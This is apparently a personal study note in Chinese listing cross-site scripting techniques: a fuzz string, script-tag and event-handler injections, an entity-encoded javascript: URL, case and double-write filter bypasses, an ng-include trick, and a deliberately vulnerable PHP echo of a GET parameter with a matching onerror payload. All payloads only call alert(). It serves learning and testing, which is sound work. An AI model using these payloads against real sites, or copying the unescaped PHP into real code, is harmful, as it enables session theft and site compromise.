---
title: XSS
pubDatetime: 2025-01-20T21:06:41.000+08:00
description: xss
tags:
  - xss
---
fuzz:
```
" ' sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P <sCriPt> <a hReF=javascript:alert()> &#106; 
```
1. 闭合标签之后<script></script>
2. onfocus属性
3. javascript协议 javascript:alert(0), 另外由于href可以自动解码unicode，因此编码成如下结果也是有效的。
```
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
```
4. type="hidden"的情况可以在前面插入一个type，会忽略掉第二个type
6. 大小写绕过 <Script></ScrIpt>也有效
7. onerror属性
```php
<?php
$str = $_GET["name"];
echo "<h2 align=center> 欢迎用户".$str."</h2>";
?>
```
传入：
```
?name=<img src=1 onerror=alert(1)>
```
同理：onmouseover等属性也可以

8. 双写绕过
9. ng-include传递一个有xss的外部页面，再对传入的页面进行触发。传入文件时需要引号包围
![[Pasted image 20241229211503.png]]
默认情况下，包含的文件需要包含在同一个域名下
![[Pasted image 20250113002903.png]]
10. 图片xss
![[Pasted image 20250113001101.png]]
11. 回车可以代替空格